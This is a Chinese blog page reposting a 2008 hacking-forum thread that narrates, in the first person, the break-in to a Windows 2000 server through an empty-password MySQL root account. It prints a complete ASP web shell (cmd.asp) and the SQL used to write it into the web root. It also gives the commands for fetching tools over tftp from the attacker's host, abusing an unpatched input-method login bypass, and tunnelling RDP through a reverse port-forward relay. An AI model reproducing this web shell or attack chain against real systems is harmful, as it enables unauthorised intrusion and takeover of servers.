
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 85 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-X--3306端口的入侵mysql/">3306端口的入侵(mysql)</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-X--3306端口的入侵mysql/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="3306-mysql-">3306端口的入侵(mysql)</h1>
<h2 id="-bbs-syue-com-http-bbs-syue-com-index-php-bbs-syue-com-"><a href="http://bbs.syue.com/index.php" title="岁月联盟 - 技术社区 - BBS.SYUE.COM" target="_blank"><img src="" alt="岁月联盟 - 技术社区 - BBS.SYUE.COM"></a></h2>
<p><a href="http://bbs.syue.com/register.php" target="_blank">注册</a> <a href="http://bbs.syue.com/logging.php?action=login" target="_blank">登录</a></p>
<ul>
<li><a href="http://syue.com/" target="_blank">主站</a></li>
<li><a href="http://bbs.syue.com/index.php" target="_blank">论坛</a></li>
<li><a href="http://bbs.syue.com/search.php" target="_blank">搜索</a></li>
<li><a href="http://home.syue.com/" target="_blank">黑友会</a></li>
<li><a href="http://bbs.syue.com/faq.php" target="_blank">帮助</a></li>
<li><p><a href="http://bbs.syue.com/misc.php?action=nav" target="_blank">导航</a></p>
</li>
<li><p><a href="http://bbs.syue.com/pm.php?filter=newpm" target="_blank">私人消息 (0)</a></p>
</li>
<li><a href="http://bbs.syue.com/pm.php?filter=announcepm" target="_blank">公共消息 (0)</a></li>
<li><a href="http://bbs.syue.com/task.php?item=doing" target="_blank">论坛任务 (0)</a></li>
<li><a href="http://bbs.syue.com/notice.php?filter=systempm" target="_blank">系统消息 (0)</a></li>
<li><a href="http://bbs.syue.com/notice.php?filter=friend" target="_blank">好友消息 (0)</a></li>
<li><a href="http://bbs.syue.com/notice.php?filter=threads" target="_blank">帖子消息 (0)</a></li>
</ul>
<p><a href="http://bbs.syue.com/index.php" target="_blank">岁月联盟 - 技术社区 - BBS.SYUE.COM</a> » <a href="http://bbs.syue.com/forum-33-1.html" target="_blank">[ Hacking &amp; Defence ] 黑客攻击与防范</a> » 3306端口的入侵(mysql)
<a href="http://bbs.syue.com/forum-33-1.html" target="_blank">返回列表</a> <a href="http://bbs.syue.com/post.php?action=newthread&amp;fid=33" target="_blank">发帖</a></p>
<p><a href="http://bbs.syue.com/space.php?uid=7" target="_blank">猪猪</a></p>
<ul>
<li><a href="http://bbs.syue.com/pm.php?action=new&amp;uid=7" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.syue.com/my.php?item=buddylist&amp;newbuddyid=7&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.syue.com/space-uid-7.html" target="_blank">猪猪</a> <em>(Wei.H)**当前离线</em>
UID 7  帖子 7814  精华 230  积分 32287  威望 2777   金币 14812   贡献 3401   性别 男  来自 中国  在线时间 2333 小时  注册时间 2006-5-11  最后登录 2010-1-8 </p>
<p><a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=100298&amp;Site=岁月联盟 - 技术社区 - BBS.SYUE.COM&amp;Menu=yes" title="QQ" target="_blank"><img src="" alt="QQ"></a><a href="http://home.syue.com/space.php?uid=7" title="个人空间" target="_blank"><img src="" alt="个人空间"></a> <a href="http://www.hackerspirit.com/" title="查看个人网站" target="_blank"><img src="" alt="查看个人网站"></a><a href="http://bbs.syue.com/space-uid-7.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.syue.com/space-uid-7.html" target="_blank"><img src="" alt=""></a></p>
<p><em><a href="http://bbs.syue.com/faq.php?action=grouppermission&amp;searchgroupid=1" target="_blank">等级：管理员</a></em></p>
<p><img src="&quot;Rank: 22&quot;" alt=""></p>
<p><img src="&quot;闪坛最高荣誉勋章&quot;" alt="闪坛最高荣誉勋章"><img src="&quot;优秀版主勋章&quot;" alt="优秀版主勋章">
 <strong><a href="&quot;复制本帖链接&quot;"><em>1</em>/#</a> <em>跳转到 »</em> <a href="http://bbs.syue.com/viewthread.php?tid=24861&amp;extra=page%3D1&amp;ordertype=1" target="_blank">倒序看帖</a></strong></p>
<p><a href="http://bbs.syue.com/viewthread.php?action=printable&amp;tid=24861" target="_blank">打印</a></p>
<p>字体大小: tT</p>
<p><img src="" alt=""> <em>发表于 2008-5-11 11:52</em> | <a href="http://bbs.syue.com/viewthread.php?tid=24861&amp;page=1&amp;authorid=7" target="_blank">只看该作者</a></p>
<h1 id="3306-mysql-">3306端口的入侵(mysql)</h1>
<p>这一节说一下3306端口,通过Mysql入侵服务器.
坦白的讲，我对mysql知道的太少,只是知它于mssql相对应的1433端口，它是3306。在w2k上它主要和是php组合，我一直学习的是asp+acess,没学习过mysql,也从来没有通过mysql成功入侵过服务器.为了使我的总结生一点光，全面一点,我这儿就转一篇文章，利用mssql入侵w2k服务器。全文如下,我加了一个图和一点注解和读后感:
某天晚上在IRC的时候，一个老朋友说帮他看看他的新主页的安全性，然后给出URL是abc.target.net,我一看觉得挺眼熟的，target.net公 司里面的CEO，人事部经理，网管我都认识的，前段时间还差点去了那里做网管呢，呵呵，那就看看他们的服务器做的如何吧。
随后用nmap扫描了一下abc.target.net，发现开的端口挺多的，看来没有安装防火墙或做TCP/IP过滤。从IIS版本判断是Windows 2000的服 务器。IIS没什么好利用的，一看开了3306端口，是mysql的，就用我的mysql客户端尝试连接了一下，root的密码竟然为空(lcx注:默认安装)，后来就觉得没有多 大意思，于是把目标转<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>，他们的主站，哈哈。
Ok!先用nmap扫描一下，扫描结果如下：
25/tcp open smtp
53/tcp open domain
80/tcp open http
110/tcp open pop-3
389/tcp open ldap
1002/tcp open unknown
3306/tcp open mysql
然后从IIS版本判断目标是windows 2000服务器。从开放的端口来看，它要么是安装了防火墙，要么是做了TCP/IP过滤，呵呵，比 abc.target.net有意思多了。从25和110端口返回的数据来看，他们用的邮件服务器是IMail 6.04，没什么可利用的。IIS上面网管做了安全配 置，一些默认的CGI漏洞也没有，这也没什么好利用的。只剩下最后一个端口了，习惯性的用我的mysql客户端连接试试：
F:\cmd〉mysql -u root -h <a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>
Welcome to the MySQL monitor. Commands end with or \g.
Your MySQL connection id is 3038 to server version: 3.23.21-beta
Type &lt;|&gt;help;&lt;|&gt; or &lt;|&gt;\h&lt;|&gt; for help. Type &lt;|&gt;\c&lt;|&gt; to clear the buffer
mysql〉
也有图形连接方式,lcx给你个图看看.
<img src="" alt=""> <img src="" alt="MySQL.gif"></p>
<p><a href="http://bbs.syue.com/attachment.php?aid=NzMwNnwzMTc2ZjZkNXwxMjYyOTQ1ODE0fGM4MDVOTHF2T2t1bFd5cjZ4TEhwSFRtNXdLL0RFUWpxMjNWWE13MEhVQlp3Q2tr&amp;nothumb=yes" title="MySQL.gif" target="_blank"><strong>下载</strong></a> (14.15 KB)
2008-5-11 11:52
呵呵，不好意思，看来网管没有给mysql帐号root设置一个密码，是默认的空密码，那么我们就可以利用这个漏洞来做点什么了。如果是 MS-SQL数据库的话就好办啦，直接可以用xp_cmdshell来运行系统命令，但是可惜的是mysql没有类似MS-SQL那样的扩展存储过程。
现在我们可以利用这个漏洞来做三件事情：
〈1〉搜索mysql数据库里面的内容，看能不能找出一些有用的敏感信息，我找了一会儿就不想找了，呵呵
〈2〉读取服务器上的任何文件，当然前提是知道文件的物理路径
〈3〉以启动mysql服务用户的权限往服务器上写文件，前提是这个文件要不存在的，就是说不能覆盖文件
如果我们知道IIS主目录的物理路径的话,我们就可以往上面写一个ASP上去，然后通过IE来执行系统命令。怎么得到IIS目录的物理路径呢 ？天知道！
没办法，猜吧。。。。。。先在mysql默认数据库test中建一个表tmp，这个表只有一个字段str,类型为TEXT,
mysql〉 use test;create table tmp（str TEXT）;
Database changed
Query OK, 0 rows affected （0.05 sec）
然后凭着自己做网管的直觉，开始猜测IIS主目录的物理路径，c:\inetpub\wwwroot，c:\www，c:\wwwroot，c:\inetpub\web,d:\web， d:\wwwroot，都不对，55555。大概猜测到第10次，我的mysql客户端回显信息如下：
mysql〉load data infile &quot;d:\www\gb\about\about.htm&quot; into table tmp;
Query OK, 235 rows affected （0.05 sec）
Records: 235 Deleted: 0 Skipped: 0 Warnings: 0
哈哈哈，猜中了，IIS主目录的物理路径是d:\www，因为上面的文件的虚拟路径是<a href="http://www.target.net/gb/about/about.htm" target="_blank"><a href="http://www.target.net/gb/about/about.htm">http://www.target.net/gb/about/about.htm</a></a>，看来我得
到一个shell了，呵呵。
接下来我们就可以往d:\www\gb\about里面写一个ASP文件进去，然后通过<a href="http://www.target.net/gb/about/cmd.asp" target="_blank"><a href="http://www.target.net/gb/about/cmd.asp">http://www.target.net/gb/about/cmd.asp</a></a>来执行系统命令了。
然后在网上找来一个现成的cmd.asp，懒的自己去写了：）。Cmd.asp如下：
-------------------------------cmd.asp----------------------------------------
〈% Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile
On Error Resume Next
Set oScript = Server.CreateObject（&quot;&quot;WSCRIPT.SHELL&quot;&quot;）
Set oScriptNet = Server.CreateObject（&quot;&quot;WSCRIPT.NETWORK&quot;&quot;）
Set oFileSys = Server.CreateObject（&quot;&quot;Scripting.FileSystemObject&quot;&quot;）
szCMD = Request.Form（&quot;&quot;.CMD&quot;&quot;）
If （szCMD 〈〉 &quot;&quot;&quot;&quot;） Then
szTempFile = &quot;&quot;C:\&quot; &amp; oFileSys.GetTempName（）
Call oScript.Run （&quot;&quot;cmd.exe /c &quot;&quot; &amp; szCMD &amp; &quot;&quot; 〉 &quot;&quot; &amp; szTempFile, 0, True）
Set oFile = oFileSys.OpenTextFile （szTempFile, 1, False, 0）
End If %〉
〈HTML〉〈BODY〉〈FORM action=&quot;&quot;〈%= Request.ServerVariables（&quot;&quot;URL&quot;&quot;） %〉&quot;&quot; method=&quot;&quot;POST&quot;&quot;〉
〈input type=text name=&quot;&quot;.CMD&quot;&quot; size=45 value=&quot;&quot;〈%= szCMD %〉&quot;&quot;〉〈input type=submit value=&quot;&quot;Run&quot;&quot;〉〈/FORM〉〈PRE〉
〈% If （IsObject（oFile）） Then
On Error Resume Next
Response.Write Server.HTMLEncode（oFile.ReadAll）
oFile.Close
Call oFileSys.DeleteFile（szTempFile, True）
End If%〉
〈/BODY〉〈/HTML〉
----------------------------end of cmd.asp-----------------------------------
由于往mysql数据库中插入数据的时候，会过滤特殊字符什么的，例如双引号之类的，特别麻烦。各位留意没有，上面的ASP语句中，都是 两个双引号一起的，这样才能写进去，原来是一个双引号的。然后我在数据库中再建一个表：
mysql〉 use test;create table cmd（str TEXT）;
Database changed
Query OK, 0 rows affected （0.05 sec）
然后用如下语句，一句一句把上面的ASP写进去:
mysql〉 insert into cmd values（&quot;一行一行的asp代码，呵呵&quot;）;
为什么不全部一起写进去呢？呵呵，换行后，一会儿导出的文件就会有特殊字符了，asp就不能正常运行了，只能辛苦点一行一行写了。然 后把asp文件导到服务器上：
mysql〉select /<em> from cmd into outfile &quot;d:\www\gb\abou\cmd.asp&quot;;
然后把我们刚才建的表都删除掉：
mysql〉 use test; drop table tmp; drop table cmd;
ok!我们得到一个shell了，虽然权限不高，但毕竟已经向取得admin权限迈出一大步了，不是吗，呵呵。做这个asp文件可花了我不少时间 哦。现在我们利用这个shell来收集系统信息，尝试取得admin权限。
〈1〉先看一下系统文件权限设置如何：
c:\ Everyone:（OI）（CI）F
d:\ \xxx:（OI）（CI）（DENY）（特殊访问:）
DELETE
READ_CONTROL
WRITE_DAC
WRITE_OWNER
STANDARD_RIGHTS_REQUIRED
FILE_READ_DATA
FILE_WRITE_DATA
FILE_APPEND_DATA
FILE_READ_EA
FILE_WRITE_EA
FILE_EXECUTE
FILE_DELETE_CHILD
FILE_READ_ATTRIBUTES
FILE_WRITE_ATTRIBUTES
Everyone:（OI）（CI）F
看来我们现在就可以读写硬盘上的任何文件了，现在就可以改他的首页了，但这样做没意思，对不对，我们的目标是取得admin权限，呵呵 。
〈2〉然后搜索一下硬盘上都有些什么文件：
c:\Program Files 的目录下有两个比较有意思的文件，
2000-12-19 13:10 　Serv-U
2001-01-20 22:43 绿色警戒
把Serv-U里面的用户和密码读出来看看后，没有什么用处，然后进入绿色警戒目录看看，呵呵，除了log外，什么都没有，呵呵。
〈3〉再看看都有哪些用户：
Guest IUSR_SERVER_1 IUSR_SERVER-2
IWAM_SERVER_1 IWAM_SERVER-2 ceo[他们CEO的帐号J]
TsInternetUser
管理员有ceo 和target\Domain Admins，看来这台机器是他们域中的一台服务器。开始本来想给ceo下一个套，在他的启动目录里放一个程序，但后来看到这个帐号已经几个月没登陆了，就放弃了。
〈4〉看看启动了那些服务，这几个比较有意思, 看来都是默认的：
Task Scheduler
Simple Mail Transport Protocol （SMTP）
Task Scheduler
〈5〉看看网络状况，这几个比较有意思：
TCP 0.0.0.0:21 0.0.0.0:0 LISTENING
TCP 0.0.0.0:119 0.0.0.0:0 LISTENING
TCP 192.168.1.3:3389 0.0.0.0:0 LISTENING
看来有TermService，不过在网卡上做了TCP/IP过滤，只对内网开放，那么我们就来
〈6〉看看网卡设置信息：
Ethernet adapter 本地连接:
Connection-specific DNS Suffix . :
Description . . . . . . . . . . . : Realtek RTL8139（A） PCI Fast Ethernet Adapter
Physical Address. . . . . . . . . : 00-E0-4C-68-C4-B2
DHCP Enabled. . . . . . . . . . . : No
IP Address. . . . . . . . . . . . : 192.168.1.3
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . :
DNS Servers . . . . . . . . . . . :
Ethernet adapter 本地连接 2:
Connection-specific DNS Suffix . :
Description . . . . . . . . . . . : Realtek RTL8139（A） PCI Fast Ethernet Adapter/#2
Physical Address. . . . . . . . . : 00-E0-4C-68-B8-FC
DHCP Enabled. . . . . . . . . . . : No
IP Address. . . . . . . . . . . . :xxx
Subnet Mask . . . . . . . . . . . :
Default Gateway . . . . . . . . . :
经过上面的一些步骤，对这台服务器的设置情况就有了一个大概的了解。如何取得admin权限？netdde?pipeupadmin?呵呵，无法利用，没 有可利用的可以登陆的用户。下套？等到什么时候，呵呵。
Okok!让我们来看看这个系统都打了些什么补丁。怎么查看？呵呵，打了补丁后，信息都会存贮在注册表中，查询注册表中的这个键值就行
了：&quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\hotfix&quot;，这样的话，我们得上传一个reg.exe[M$ Resource Kit中的命令行注册 表编辑器]到服务器里面，我们才能操作他的注册表。开始我想用先写一个ftp脚本，然后ftp -s:cmd.txt让他到我的服务器来下载，但结果失 败了，后来才想起他做了TCP/IP过滤，5555，我记性真不好。怎么办呢？有办法，用tftp来传输。我先在我的服务器上安装了一个Cisco TFTP
Server，然后在目标机器上运行tftp -I <a href="http://www.eyas.org/" target="_blank"><a href="http://www.eyas.org/">http://www.eyas.org/</a></a> GET reg.exe，呵呵，传输过去咯。然后运行
REG QUERY &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\hotfix&quot;
返回数据如下：
Listing of [Software\Microsoft\Windows NT\CurrentVersion\hotfix]
[Q147222]==〉这个不知道是什么东西，好象默认2k机器上都有
[Q269862]==〉Q269862_W2K_SP2_x86_CN.EXE==〉Microsoft IIS Unicode解码目录遍历漏洞!
[Q277873]==〉Q277873_W2K_sp2_x86_CN.EXE==〉Microsoft IIS CGI文件名检查漏洞!
呵呵，==〉和后面的说明是我加上去的，不是注册表中的。看来管理员不太勤快啊，只打了两个补丁。
哈哈！到了这一步，大家想到怎么取得admin权限了吗？呵呵，你一定也想到了，他的机器开了TermService服务，但windows2000登陆验证 可被绕过的漏洞没有安装补丁，此补丁为Q270676_W2K_SP2_x86_CN.EXE。由此看来，管理员只是删除了帮助法文件，而没有打补丁。用dir
c:\winnt\help\win/</em>验证一下，果然没有熟悉的输入法帮助文件。敌人没有输入法，我们帮他造，hoho~~别忘了我们可以往任何地方写文件哦。
嘻嘻，咱们也别高兴的太早了，别忘了他的机器做了TCP/IP过滤哦，我们是没有办法连接到他的3389端口的。不要着急，不要着急，让我 们先来看看他的TCP/IP过滤的设置情况。怎么看呢？老办法，查看注册表里面的键值啦。用刚才的reg.exe查询
〈1〉reg QUERY &quot;HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces&quot;
Listing of [System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces]
[{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}]
[{612A3142-DB85-4D4E-8028-81A9EB4D6A51}]
〈2〉reg QUERY &quot;HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}&quot;
Listing of [System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}]
MULTI_SZ IPAddress
MULTI_SZ TCPAllowedPorts 25;53;80;110;3306;
MULTI_SZ UDPAllowedPorts 0;
MULTI_SZ RawIPAllowedProtocols 0;
〈3〉reg QUERY &quot;HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{612A3142-DB85-4D4E-8028-81A9EB4D6A51}&quot;
Listing of [System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{612A3142-DB85-4D4E-8028-81A9EB4D6A51}]
MULTI_SZ IPAddress 192.168.1.3;
MULTI_SZ TCPAllowedPorts 0;
MULTI_SZ UDPAllowedPorts 0;
MULTI_SZ RawIPAllowedProtocols 0;
篇幅关系，我过滤了一些输出。第二次查询的是外网网卡，我们可以得知只开放了TCP 25，53，80，110，3306，UDP全部，IP协议全部。 第三次查询的是内网网卡，没有任何限制。
现在我们可以把输入法帮助文件上传到他的c:\winnt\help目录下去，然后如果能连接到他的3389端口的话，我们就可以得到admin权限了。问 题的关键是外网网卡做了TCP/IP限制。55555，怎么办呢？如何突破？有办法！我们可以利用socket转发和反弹端口技术，照样可以连接到敌人 的TermService！
具体过程如下：
〈1〉在我的另一台服务<a href="http://www.eyas2.org/" target="_blank"><a href="http://www.eyas2.org/">http://www.eyas2.org/</a></a>[我称他为AgentMaster]上运行一个程序，监听3389端口[等待我的TermClient去连接]，监听11111端
口[等<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>来连接]，当然了，第2个端口可以随便选，第1个端口选其他的话，就要相应的修改
TermClient，比较麻烦
〈2〉<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>[我称他为AgentSlave]运行另外一个程序， 先连接<a href="http://www.eyas2.org:11111/" target="_blank"><a href="http://www.eyas2.org:11111/">http://www.eyas2.org:11111/</a></a>，再连接到192.168.1.3:3389[敌人服务器 内网的IP]
〈3〉 我的TermClient连接<a href="http://www.eyas2.org:3389/" target="_blank"><a href="http://www.eyas2.org:3389/">http://www.eyas2.org:3389/</a></a>，这样，数据通道就全部建立好了。接下来，两个程序就忠实的为我们转发数据了。
注意<a href="http://www.eyas2.orgwww.eyas.org/" target="_blank"><a href="http://www.eyas2.orgwww.eyas.org/">http://www.eyas2.orgwww.eyas.org/</a></a>可以为同一台服务器，但要保<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>能connect上你的服务器。192.168.1.3也可以换为他内网 的任何一个IP。这样，当我用TermClient连接<a href="http://www.eyas2.org/" target="_blank"><a href="http://www.eyas2.org/">http://www.eyas2.org/</a></a>的时候，其实是连接<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>。当熟悉的登陆界面出现在我面前，我熟练的调出输入法，取得admin权限，呵呵，心里还有那么一点点成就感！
简要的回顾一下：发现mysql漏洞==〉凭直觉猜中IIS物理路径==〉写一个cmd.asp文件上去得到一个shell==〉利用系统配置错误取得admin 权限接下来要做的事情，就是把漏洞通知他们的网管了[我可不敢直接告诉他们CEO，呵呵]，本来想在那机器上装个sniff什么的，再用来做跳 板进一步尝试入侵他的内网，但后来想想还是算了，呵呵。
这是我在网上发现一篇好文章,读起来如饮香醇,满心喜悦,并对作者由衷佩服，赞赏他的技术,更是思路.这也是我们菜鸟和伪高手努力的一个方向了.mysql入门指南。
<a href="">收藏</a> <a href="">分享</a>  **</p>
<p><a href="http://bbs.syue.com/space.php?uid=23555" target="_blank">djyangmaowei</a></p>
<ul>
<li><a href="http://bbs.syue.com/pm.php?action=new&amp;uid=23555" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.syue.com/my.php?item=buddylist&amp;newbuddyid=23555&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.syue.com/space-uid-23555.html" target="_blank">djyangmaowei</a> <em>当前离线</em>
UID 23555  帖子 65  精华 0  积分 141  威望 0   金币 66   贡献 0   在线时间 10 小时  注册时间 2008-4-29  最后登录 2008-9-17 </p>
<p><a href="http://home.syue.com/space.php?uid=23555" title="个人空间" target="_blank"><img src="" alt="个人空间"></a> <a href="http://bbs.syue.com/space-uid-23555.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href=""></a></p>
<p><a href="http://bbs.syue.com/space-uid-23555.html" target="_blank"><img src="" alt=""></a></p>
<p><em><a href="http://bbs.syue.com/faq.php?action=grouppermission&amp;searchgroupid=12" target="_blank">级别：上士</a></em></p>
<p><img src="&quot;Rank: 7&quot;" alt="">
 <strong><a href="&quot;复制本帖链接&quot;"><em>2</em>/#</a></strong></p>
<p><img src="" alt=""> <em>发表于 2008-5-19 16:44</em> | <a href="http://bbs.syue.com/viewthread.php?tid=24861&amp;page=1&amp;authorid=23555" target="_blank">只看该作者</a></p>
<p>qianghan  **</p>
<p><a href="">TOP</a>
<a href="http://bbs.syue.com/forum-33-1.html" target="_blank">返回列表</a></p>
<h3 id="-"><a href="">[收藏此主题]</a>  <a href="">[关注此主题的新回复]</a></h3>
<h3 id="-qq-msn-"><a href="">[通过 QQ、MSN 分享给朋友]</a></h3>
<p><strong><a href="http://bbs.syue.com/" target="_blank">岁月联盟</a></strong> ( <a href="http://www.miibeian.gov.cn/" target="_blank">皖ICP备05004589号 - 联系QQ:100298</a>)|<a href="mailto:admin@syue.com">联系我们</a> |<a href="http://bbs.syue.com/stats.php" target="_blank">论坛统计</a>|<a href="http://bbs.syue.com/archiver/" target="_blank">Archiver</a>|<a href="http://bbs.syue.com/wap/" target="_blank">WAP</a>|</p>
<p>GMT+8, 2010-1-8 18:16.</p>
<p>Powered by <strong><a href="http://www.discuz.net/" target="_blank">Discuz!</a></strong> <em>7.2</em></p>
<p>© 2001-2009 <a href="http://www.comsenz.com/" target="_blank">Comsenz Inc.</a>
<a href="http://www.google.com/" target="_blank"><img src="" alt="Google"></a> 输入您的搜索字词  提交搜索表单   Web syue.com</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/X/">X</a></li></span></span> | <span class="tags">Tagged <a href="/tags/X/" class="label label-primary">X</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-X--3306端口的入侵mysql/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-X--3306端口的入侵mysql" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-学习手册类--Zmap详细用户手册和DDOS的可行性/">Zmap详细用户手册和DDOS的可行性</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-学习手册类--Zmap详细用户手册和DDOS的可行性/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="zmap-ddos-">Zmap详细用户手册和DDOS的可行性</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<h1 id="-wooyun-http-drops-wooyun-org-wooyun-"><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">WooYun知识库</a></h1>
